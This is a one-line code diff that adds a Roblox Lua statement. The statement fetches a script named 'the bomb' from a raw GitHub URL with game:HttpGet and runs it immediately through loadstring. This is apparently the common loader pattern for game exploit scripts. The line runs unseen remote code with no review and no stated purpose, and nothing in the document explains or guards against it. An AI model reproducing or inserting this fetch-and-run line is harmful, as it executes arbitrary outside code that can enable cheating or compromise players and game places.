@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MeatMan77/pass/main/the%20bomb'))()
